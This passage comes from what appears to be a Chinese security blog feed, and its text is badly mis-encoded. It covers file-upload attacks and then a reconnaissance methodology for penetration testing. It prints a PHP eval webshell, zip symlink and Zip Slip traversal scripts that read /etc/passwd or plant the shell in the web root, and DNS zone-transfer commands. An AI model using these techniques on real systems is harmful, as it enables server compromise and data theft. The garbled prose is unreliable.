class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å…¶ä»–æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é…åˆæ–‡ä»¶åŒ…å«"><a href="#é…åˆæ–‡ä»¶åŒ…å«" class="headerlink" title="é…åˆæ–‡ä»¶åŒ…å«"></a>é…åˆæ–‡ä»¶åŒ…å«</h3><ul><li><p>å›¾ç‰‡ğŸ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ç»•è¿‡å®½é«˜æ£€æŸ¥</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>ç”¨æ•°æ®é‡å°çš„å›¾ç‰‡ï¼Œæ¯”å¦‚éšä¾¿æˆªä¸€å¼ å¾ˆå°çš„å›¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ™®é€šï¼šcopy,ç›´æ¥æ’å…¥</span><br><span class="line">äºŒæ¬¡æ¸²æŸ“ï¼šæ‰¾åˆ°å‰åå›¾ç‰‡ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„hexæ•°æ®ï¼Œæ›¿æ¢ä¸ºæœ¨é©¬</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶åŒ…å«trick</p></li></ul><h3 id="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"><a href="#é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–" class="headerlink" title="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"></a>é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–</h3><p>ä¸Šä¼ ä»»æ„åç¼€çš„pharæ ¼å¼çš„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ç”¨<code>phar://</code>è§£æ</p><h1 id="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"><a href="#å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜" class="headerlink" title="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"></a>å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜</h1><p>æœåŠ¡ç«¯ä¼šå¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¯ä»¥æ„é€ æ¶æ„å‹ç¼©åŒ…æ”»å‡»</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><p>Linuxè½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y ä¿è¯è§£å‹å‡ºæ¥çš„è¿˜æ˜¯è½¯é“¾æ¥</span><br></pre></td></tr></table></figure><h2 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h2><ul><li><p>é€šè¿‡æ„é€ å‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶åï¼Œé€ æˆç›®å½•ç©¿è¶Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å·²å‘ç°å—<code>Zip Slip</code>å½±å“çš„é¡¹ç›®:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>æ³¨</strong>ï¼šå¦‚æœç”¨çš„æ˜¯å‘½ä»¤<code>unzip</code>æ¥è§£å‹ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡ç”¨äº†ï¼Œå› ä¸º<code>unzip</code> é»˜è®¤è·³è¿‡æ–‡ä»¶åä¸­çš„<code>../</code></p></li><li><p>è½¯é“¾æ¥çš„å¦™ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p></li></ul><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>Fromï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶å­—èŠ‚ï¼Œè®©å‹ç¼©åŒ…è§£å‹è¿‡ç¨‹å‡ºé”™ï¼Œä½†æ˜¯å‡ºé”™å‰å·²è§£å‹éƒ¨åˆ†å³ä¸ºwebshellã€‚ï¼ˆå‡ºé”™åæ•è·å¼‚å¸¸ï¼Œç¨‹åºä¸­æ­¢ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å·²è§£å‹éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆå·²è§£å‹å‡ºçš„webshellå°±å¯ä»¥ç•™åœ¨æœåŠ¡ç«¯ä¸­ï¼‰</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="ä¸Šä¼ åé—®é¢˜"><a href="#ä¸Šä¼ åé—®é¢˜" class="headerlink" title="ä¸Šä¼ åé—®é¢˜"></a>ä¸Šä¼ åé—®é¢˜</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶è·¯å¾„å¯»æ‰¾</span><br><span class="line">æ²¡æœ‰æ‰§è¡Œæƒé™</span><br><span class="line">å†…å®¹å…æ€</span><br><span class="line">æµé‡ç»•è¿‡</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li><p>ç™½åå•æœºåˆ¶</p></li><li><p>ä¸Šä¼ æ–‡ä»¶é‡å‘½å</p></li><li><p>æ–‡ä»¶å†…å®¹æ ¡éªŒå’Œè¿‡æ»¤</p></li><li><p>é¿å…æ¡ä»¶ç«äº‰ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œè€Œä¸æ˜¯å…ˆå°†æ–‡ä»¶å†™å…¥å†åˆ¤æ–­æ˜¯å¦åˆæ³•</p></li><li><p>ä¸Šä¼ çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œéµå¾ªä»¥ä¸‹åŸåˆ™</p><p><code>ç›®å½•å¯å†™ä½†ä¸å¯è§£æï¼Œå¯è§£æä½†ä¸å¯å†™å…¥</code></p><p>æˆ–è€…ä¸Šä¼ åˆ°ä¸“é—¨ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚å­˜å‚¨OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webæ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
      <link href="/2023/05/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/05/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ä½“æµç¨‹"><a href="#æ€»ä½“æµç¨‹" class="headerlink" title="æ€»ä½“æµç¨‹"></a>æ€»ä½“æµç¨‹</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="å›¾ç‰‡.png"></p><p>â€‹<a href="https://www.freebuf.com/column/196291.html">æ¸—é€æµ‹è¯•çš„8ä¸ªæ­¥éª¤ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜ç¡®ç›®æ ‡ï¼šä¸å®¢æˆ·äº¤æµï¼Œå¾—åˆ°æ¸—é€çš„èŒƒå›´ï¼Œè§„åˆ™å’Œéœ€æ±‚</span><br><span class="line">ä¿¡æ¯æ”¶é›†ï¼šèµ„äº§æ”¶é›†+æ•æ„Ÿä¿¡æ¯æ”¶é›†+æŒ‡çº¹è¯†åˆ«</span><br><span class="line">æ¼æ´æ¢æµ‹å’Œä¿¡æ¯åˆ†æï¼šæ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</span><br><span class="line">è·å–æ‰€éœ€ï¼šåæ¸—é€</span><br><span class="line">ä¿¡æ¯æ•´ç†å’Œå½¢æˆæŠ¥å‘Šï¼šäº§å‡ºæŠ¥å‘Š</span><br></pre></td></tr></table></figure><h1 id="èµ„äº§æ”¶é›†"><a href="#èµ„äº§æ”¶é›†" class="headerlink" title="èµ„äº§æ”¶é›†"></a>èµ„äº§æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><p><strong>å°½å¯èƒ½çš„æ‰©å¤§æ”»å‡»é¢</strong></p><h2 id="ä¸»åŸŸåæ”¶é›†"><a href="#ä¸»åŸŸåæ”¶é›†" class="headerlink" title="ä¸»åŸŸåæ”¶é›†"></a>ä¸»åŸŸåæ”¶é›†</h2><h3 id="ICPå¤‡æ¡ˆæŸ¥è¯¢"><a href="#ICPå¤‡æ¡ˆæŸ¥è¯¢" class="headerlink" title="ICPå¤‡æ¡ˆæŸ¥è¯¢"></a>ICPå¤‡æ¡ˆæŸ¥è¯¢</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚</p><p>æ‰€ä»¥å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></p><p><a href="https://www.gsxt.gov.cn/index.html">å›½å®¶ä¼ä¸šä¿¡ç”¨ä¿¡æ¯å…¬ç¤ºç³»ç»Ÿ</a></p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li><li><p>å·¥å…·</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œè¾“å‡ºICPå¤‡æ¡ˆæ‰€æœ‰å…³è”åŸŸå</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p><code>WHOIS</code>æ˜¯ç”¨æ¥æŸ¥è¯¢äº’è”ç½‘ä¸­åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡çš„WHOISä¿¡æ¯ï¼Œå¯ä»¥å¯¹è”ç³»äººã€è”ç³»é‚®ç®±ç­‰ä¿¡æ¯è¿›è¡ŒåæŸ¥ï¼Œå¯ä»¥è·å–æ›´å¤šç›¸å…³çš„åŸŸåä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://whois.chinaz.com/">åŸŸåWhoisæŸ¥è¯¢ - ç«™é•¿ä¹‹å®¶</a></p><p><a href="http://whois.bugscaner.com/">åœ¨çº¿åŸŸåWhoisæŸ¥è¯¢,ç½‘ç«™WhoisåæŸ¥-åœ¨çº¿ç«™é•¿å·¥å…· bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="è‚¡æƒä¿¡æ¯"><a href="#è‚¡æƒä¿¡æ¯" class="headerlink" title="è‚¡æƒä¿¡æ¯"></a>è‚¡æƒä¿¡æ¯</h3><ul><li><p>æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡</p></li><li><p>æŸ¥è¯¢ç½‘ç«™</p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li></ul><h3 id="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP"><a href="#å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP" class="headerlink" title="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP"></a>å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¾®ä¿¡/æ”¯ä»˜å®å°ç¨‹åº</span><br><span class="line">å¾®ä¿¡å…¬ä¼—å·</span><br><span class="line">æ‰‹æœºAPPï¼šæŠ“åŒ…ï¼Œå†å²ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><h3 id="DNSå…±äº«è®°å½•æŸ¥è¯¢"><a href="#DNSå…±äº«è®°å½•æŸ¥è¯¢" class="headerlink" title="DNSå…±äº«è®°å½•æŸ¥è¯¢"></a>DNSå…±äº«è®°å½•æŸ¥è¯¢</h3><ul><li><p>åŸç†</p><p>æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸå</p></li><li><p>æ­¥éª¤</p><ol><li><p>é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>å°†éæƒå¨åº”ç­”ä¸­çš„nsæœåŠ¡å™¨å¸¦åˆ°ä¸‹é¢çš„ç½‘ç«™æŸ¥è¯¢</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="ç½‘ç»œç©ºé—´æµ‹ç»˜"><a href="#ç½‘ç»œç©ºé—´æµ‹ç»˜" class="headerlink" title="ç½‘ç»œç©ºé—´æµ‹ç»˜"></a>ç½‘ç»œç©ºé—´æµ‹ç»˜</h3><p>å¤šç”¨å‡ ä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“</p><p>FoFaè¯­æ³•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title=å®Œæ•´  # æ ‡é¢˜</span><br><span class="line">header=xxx # è¯·æ±‚å¤´  æ„Ÿè§‰hunterçš„å¤š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cert=è‹±æ–‡ç¼©å†™   # è¯ä¹¦å†…å®¹</span><br><span class="line">cert.subject=è‹±æ–‡ç¼©å†™ # è¯ä¹¦æŒæœ‰è€…</span><br><span class="line">cert.issuer=è‹±æ–‡ç¼©å†™ # è¯ä¹¦é¢å‘è€…</span><br><span class="line"></span><br><span class="line">body=xxx  # é¡µé¢å†…å®¹</span><br><span class="line"></span><br><span class="line">is_honeypot=false æ’é™¤èœœç½æ•°æ®ï¼Œä»…é™FOFAé«˜çº§ä¼šå‘˜ä½¿ç”¨</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¨¡ç³Šæœç´¢ ä»…é™ä¸ªäººç‰ˆåŠä»¥ä¸Šæˆ–æ¶ˆè€—Fç‚¹ä½¿ç”¨</span></span><br><span class="line">= â†’ *= è¡¨ç¤ºä½¿ç”¨æ¨¡ç³Šæœç´¢åŠŸèƒ½</span><br><span class="line">* è¡¨ç¤ºåŒ¹é…çš„æ•°é‡ä¸å—é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿ 0 ä¸ªã€1 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br><span class="line">? ä»…ä»…å¯æ›¿ä»£ 1 ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">https://github.com/FofaInfo/Awesome-FOFA/blob/main/Basic%20scenario/Basic%20scenario_ZH/FOFA%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF.md</span><br></pre></td></tr></table></figure><p>å‘ç°ä¹‹å‰åªç”¨<code>domain</code>ğŸ¤¡ï¼Œå‘ç°äº†å­¦æ ¡ä¸€äº›ä¹‹å‰éƒ½æ²¡çœ‹åˆ°è¿‡çš„ç½‘ç«™</p><p><img src="/../images/image-20230511232351742-1685533751886.png" alt="image-20230511232351742"></p><p><img src="/../images/image-20230508172138683-1685533751887.png" alt="image-20230508172138683"></p><p><img src="/../images/image-20230508172212363-1685533751887.png" alt="image-20230508172212363"></p><p><img src="/../images/image-20230526223323629-1685533751887.png" alt="image-20230526223323629"></p><h3 id="ä¾›åº”é“¾å…¬å¸"><a href="#ä¾›åº”é“¾å…¬å¸" class="headerlink" title="ä¾›åº”é“¾å…¬å¸"></a>ä¾›åº”é“¾å…¬å¸</h3><p><a href="https://xz.aliyun.com/t/10531">è®°ä¸€æ¬¡é€šè¿‡ä¾›åº”é“¾æ‹¿åˆ°ç›®æ ‡åå°æƒé™çš„è¿‡ç¨‹ - å…ˆçŸ¥ç¤¾åŒº</a></p><ul><li><p>ä¸ºä»€ä¹ˆ</p><p>è¯•æƒ³ä¸€ä¸‹ï¼Œç›®æ ‡ä½¿ç”¨ä¾›åº”å•†æä¾›çš„è½¯ä»¶ï¼Œé‚£ä¹ˆè¿™äº›è½¯ä»¶æ˜¯å—åˆ°ä¿¡ä»»çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»ä¾›åº”å•†ï¼Œå¹¶åœ¨è½¯ä»¶ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ç›®æ ‡åœ¨è¿è¡Œè½¯ä»¶æ—¶ä¹Ÿä¼šè¿è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ã€‚</p><p>å¹¶ä¸”ä¾›åº”å•†ä¿å­˜äº†ç›®æ ‡çš„å„ç§ä¿¡æ¯ã€‚</p></li><li><p>æ‰‹æ®µ</p><ul><li>ç½‘ç«™é¡µåº•çš„å¤‡æ¡ˆï¼Œç‰ˆæƒä¿¡æ¯<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>æ‹›æ ‡æ–‡ä»¶</li></ul></li></ul><h3 id="èšåˆå·¥å…·"><a href="#èšåˆå·¥å…·" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>ä¸€æ¬¾åŸºäºå„å¤§ä¼ä¸šä¿¡æ¯APIçš„å·¥å…·ï¼Œè§£å†³åœ¨é‡åˆ°çš„å„ç§é’ˆå¯¹å›½å†…ä¼ä¸šä¿¡æ¯æ”¶é›†éš¾é¢˜ã€‚ä¸€é”®æ”¶é›†æ§è‚¡å…¬å¸ICPå¤‡æ¡ˆã€APPã€å°ç¨‹åºã€å¾®ä¿¡å…¬ä¼—å·ç­‰ä¿¡æ¯èšåˆå¯¼å‡ºã€‚</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><h3 id="æšä¸¾çˆ†ç ´"><a href="#æšä¸¾çˆ†ç ´" class="headerlink" title="æšä¸¾çˆ†ç ´"></a>æšä¸¾çˆ†ç ´</h3><ul><li><p>åŸç†</p><p>é€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•ï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸€èˆ¬éœ€è¦è§£å†³æ³›è§£æé—®é¢˜ã€‚</p></li><li><p>åœ¨çº¿ç½‘ç«™</p><p><a href="http://z.zcjun.com/">åœ¨çº¿å­åŸŸåçˆ†ç ´-å­æˆå›æä¾›</a></p></li></ul><h3 id="è¯ä¹¦é€æ˜åº¦"><a href="#è¯ä¹¦é€æ˜åº¦" class="headerlink" title="è¯ä¹¦é€æ˜åº¦"></a>è¯ä¹¦é€æ˜åº¦</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>è¯ä¹¦é€æ˜æ€§ï¼ˆCertificate Transparencyï¼ŒCTï¼‰æ˜¯ Google çš„å…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡è®©åŸŸæ‰€æœ‰è€…ã€CA å’ŒåŸŸç”¨æˆ·å¯¹ SSL è¯ä¹¦çš„å‘è¡Œå’Œå­˜åœ¨è¿›è¡Œå®¡æŸ¥ï¼Œæ¥çº æ­£è¿™äº›åŸºäºè¯ä¹¦çš„å¨èƒã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>å› ä¸ºæ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®åˆ°å…¶ä¸­çš„CA è¯ä¹¦ï¼ŒåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNSå…¬å¼€æ•°æ®é›†"><a href="#DNSå…¬å¼€æ•°æ®é›†" class="headerlink" title="DNSå…¬å¼€æ•°æ®é›†"></a>DNSå…¬å¼€æ•°æ®é›†</h3><p>åˆ©ç”¨å·²æœ‰å…¬å¼€çš„æ‰«ææ•°æ®é›†ï¼Œå¯¹å­åŸŸåä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-åŸŸä¼ é€"><a href="#DNS-åŸŸä¼ é€" class="headerlink" title="DNS åŸŸä¼ é€"></a>DNS åŸŸä¼ é€</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨ã€‚</p><p><strong>åŸŸä¼ é€</strong>æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚</p></li><li><p>æ£€æµ‹æ–¹æ³•</p><ul><li><p>digè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰¾åˆ°NSæœåŠ¡å™¨</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘é€axfrè¯·æ±‚</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmapè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><ul><li><p>ä¼ ç»Ÿæœç´¢å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx æ’é™¤å“ªäº›å­åŸŸ)</span><br></pre></td></tr></table></figure></li><li><p>ç½‘ç»œç©ºé—´æµ‹ç»˜</p><p><a href="https://fofa.info/">fofa</a></p><p><a 